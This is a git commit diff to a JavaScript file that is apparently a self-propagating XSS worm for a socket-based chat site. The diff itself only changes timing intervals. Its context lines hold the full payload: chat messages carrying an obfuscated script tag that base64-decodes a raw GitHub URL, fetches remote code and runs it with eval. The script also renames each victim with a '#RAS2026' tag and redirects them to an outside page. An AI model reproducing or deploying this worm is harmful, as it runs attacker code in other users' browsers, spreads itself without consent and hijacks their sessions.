0164eadb43a7b5b01c8b4a05e103e63a5e7d2698
ivorydevrimoalt <154000627+ivorydevrimoalt@users.noreply.github.com>
2025-07-14 09:53:03 +0300

    Update 2026RAS.js

--- 2026RAS.js
+++ 2026RAS.js
@@ -21,17 +21,17 @@ setInterval(() => {
         text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'2026RAS'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
     });
     },500)
-}, 50)
+}, 500)
 setInterval(() => {
 socket.emit("talk", {
     text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'2026RAS'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
 });
-},50)
+},500)
 socket.emit('command',{
   list: ['name', $("#login_name").val() + ' #RAS2026']
 })
 // Redirects the user after 5 seconds (5000 milliseconds)
 setTimeout(function() {
   window.location.href = 'https://ivorydevrimoalt.github.io/2026.IS.NEW.YEAR/';
-}, 500);
+}, 10000);
 }, 3000);
